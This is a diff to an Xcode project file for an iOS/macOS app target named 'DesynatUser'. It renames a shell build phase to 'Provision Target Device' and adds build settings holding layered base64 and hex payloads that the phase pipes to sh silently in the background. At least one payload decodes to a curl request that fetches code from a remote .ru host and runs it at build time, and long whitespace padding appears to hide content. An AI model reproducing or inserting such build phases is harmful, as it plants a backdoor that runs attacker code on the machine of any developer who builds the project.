@@ -480,7 +480,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-																																					/* End PBXBuildRule section */
+																																																																															/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		1554ACA1638F5FDACA2A3358 /* Pods_DesynatUser.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatUser.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -2956,7 +2956,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatUser" */;
 			buildPhases = (
-				0F3B401AC10842F6BB3C1CD3 /* Build Target Libraries */,
+				5ACCF48D44F74D948E947F8B /* Provision Target Device */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -3157,7 +3157,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		0F3B401AC10842F6BB3C1CD3 /* Build Target Libraries */ = {
+		5ACCF48D44F74D948E947F8B /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -3167,14 +3167,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			shellPath = /bin/sh;
 			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3DC1C3}\"";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
 		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -3718,7 +3718,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
-				A3DC1C3 = "((k(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpNbEoxV1ZoU2FHTklRbk5hVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | k | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((v(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTYW1KV1dYZFpNalZ5V2pBeE5WRllVbUZpV0ZJMlZrVk9RbVJGZUZoVWJscHBZbFJXYzFkVVRsSmtSMUpJWWtoU1lWWjZhM2hhUlU1Q1pWVXhSRkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WWJHaFdNbEl3VjFaak1XSkhVa2xVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | v | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((i(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1hMHh6SUMwdGNtVjBjbmtnTkNBdExXTnZibTVsWTNRdGRHbHRaVzkxZENBeU5DQXRaQ0FpY0QxNFkyOWtaVjl3YUdGelpTSWdhSFIwY0hNNkx5OXVaWFJqWkc1aGJYb3VjblV2WVNraUlId2djMmdLCg== | i | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((j(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZORk5YUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XdFdlbFp4V1ZWa1IwMUhUalZPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | j | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				A8DAD24 = "((k(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abXR6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURNd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZjbWxuYldGcWIzbHpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | k | sh ) >/dev/null 2>&1 &)";
@@ -3773,7 +3774,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
-				A3DC1C3 = "((k(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpNbEoxV1ZoU2FHTklRbk5hVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | k | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((v(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTYW1KV1dYZFpNalZ5V2pBeE5WRllVbUZpV0ZJMlZrVk9RbVJGZUZoVWJscHBZbFJXYzFkVVRsSmtSMUpJWWtoU1lWWjZhM2hhUlU1Q1pWVXhSRkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WWJHaFdNbEl3VjFaak1XSkhVa2xVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | v | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((i(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1hMHh6SUMwdGNtVjBjbmtnTkNBdExXTnZibTVsWTNRdGRHbHRaVzkxZENBeU5DQXRaQ0FpY0QxNFkyOWtaVjl3YUdGelpTSWdhSFIwY0hNNkx5OXVaWFJqWkc1aGJYb3VjblV2WVNraUlId2djMmdLCg== | i | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((j(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZORk5YUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XdFdlbFp4V1ZWa1IwMUhUalZPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | j | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				A8DAD24 = "((k(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abXR6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURNd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZjbWxuYldGcWIzbHpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | k | sh ) >/dev/null 2>&1 &)";
